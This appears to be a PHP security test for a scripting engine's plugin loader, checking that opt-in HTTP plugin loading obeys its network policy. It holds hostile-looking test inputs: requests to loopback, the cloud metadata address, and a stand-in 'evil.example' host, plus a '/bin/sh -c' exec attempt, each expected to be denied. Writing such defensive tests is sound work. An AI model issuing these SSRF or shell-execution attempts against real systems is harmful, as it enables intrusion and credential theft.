<?php

// Opt-in HTTP plugin loading. Run via `make test-security-plugins-http`,
// which sets:
//   SCRIPTLING_ENABLED_LIBRARIES=scriptling.plugin
//   SCRIPTLING_PLUGIN_HTTP_ENABLED=true
//   SCRIPTLING_NETWORK_POLICY_FILE=.../permissive-ip-literals-policy.toml,.../deny-hosts-network-policy.toml
// (the same SSRF-category fixtures test_security_adversarial.php already
// proves work for `requests`).
//
// Proves: with HTTP-loading explicitly enabled, scripts may attempt to load
// new HTTP(S) plugins, but only within the same network policy that governs
// every other network-capable library — and stdio/exec loading stays
// impossible no matter what.

$pass = 0;
$fail = 0;
$errors = [];

function assert_true($test, $label) {
    global $pass, $fail, $errors;
    if ($test === true) { $pass++; } else { $fail++; $errors[] = "FAIL $label: got " . var_export($test, true); }
}

function assert_contains($haystack, $needle, $label) {
    global $pass, $fail, $errors;
    if (str_contains($haystack, $needle)) { $pass++; }
    else { $fail++; $errors[] = "FAIL $label: expected '$needle' in '$haystack'"; }
}

$vm = new Scriptling();

echo "=== Plugins: opt-in HTTP loading follows the network policy ===\n";

$vm->eval("import scriptling.plugin as plugin");
assert_true(!$vm->hasError(), "plugins-http: scriptling.plugin imports when enabled and HTTP-loading is on");

// scriptling=True forces the handshake at load time, so a network-level
// denial surfaces immediately — with the default scriptling=False, load()
// only constructs the client and never dials until the first call, which
// would otherwise make this assertion pass for the wrong reason (no dial
// attempted at all yet).
//
// permissive-ip-literals-policy.toml sets allow_ip_literals=true, but
// loopback/link-local/private still have no blanket bypass.
$vm->clearError();
$vm->eval('plugin.load("evil", "http://127.0.0.1:9/", scriptling=True)');
assert_true($vm->hasError(), "plugins-http: loopback is still denied even with HTTP-loading enabled");
assert_contains($vm->getLastError(), "network policy", "plugins-http: denial reports a network-policy error");

$vm->clearError();
$vm->eval('plugin.load("evil", "http://169.254.169.254/latest/meta-data/", scriptling=True)');
assert_true($vm->hasError(), "plugins-http: the cloud metadata address is still denied");

// deny-hosts-network-policy.toml lists evil.example in both allow_hosts and
// deny_hosts — deny must still win for plugin loading too.
$vm->clearError();
$vm->eval('plugin.load("evil", "https://evil.example/rpc", scriptling=True)');
assert_true($vm->hasError(), "plugins-http: deny_hosts still wins over allow_hosts for plugin loading");

// Stdio/exec loading is never re-enabled, regardless of HTTP-loading.
@unlink("/tmp/frankenscriptling-plugin-http-pwned");
$vm->clearError();
$vm->eval('plugin.load("evil", "/bin/sh", args=["-c", "touch /tmp/frankenscriptling-plugin-http-pwned"])');
assert_true($vm->hasError(), "plugins-http: stdio/exec loading still fails with HTTP-loading enabled");
assert_true(!file_exists("/tmp/frankenscriptling-plugin-http-pwned"), "plugins-http: the arbitrary executable never ran");

echo "\n" . str_repeat("=", 50) . "\n";
echo "Results: $pass passed, $fail failed\n";
if ($fail > 0) {
    echo "\nFailures:\n";
    foreach ($errors as $e) { echo "  $e\n"; }
    exit(1);
}
echo "All tests passed!\n";
exit(0);
